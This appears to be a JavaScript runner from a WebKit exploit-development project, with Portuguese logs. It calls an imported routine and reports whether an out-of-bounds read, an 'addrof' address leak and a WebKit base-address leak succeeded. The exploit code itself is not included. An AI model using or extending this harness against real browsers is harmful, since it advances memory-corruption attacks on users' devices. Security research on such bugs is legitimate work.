// js/script3/runAllAdvancedTestsS3.mjs (Atualização Cosmética)

import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    // <<< MUDANÇA: Nome da função e módulo atualizados >>>
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, 
    FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CALLFRAME
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim_R83() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R83"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CALLFRAME;

    if (result.errorOccurred) {
        logS3(`  RUNNER R83: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R83: Completou. Melhor OOB usado: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);

        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;
        
        if (addrofResult) {
            logS3(`  RUNNER R83: Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R83: Teste Addrof não produziu resultado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R83: Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkit_base_candidate || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R83: Teste WebKit Base Leak não produziu resultado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}_R83: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}_R83: Addrof OK, WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}_R83: Addrof/WebKitLeak Fail`;
        }
    } else {
        document.title = `${module_name_for_title}_R83: Invalid Result Obj`;
    }
    
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CALLFRAME}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R83 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R83();
    logS3(`\n==== Script 3 R83 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CALLFRAME) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CALLFRAME}_R83 Done`;
    }
}
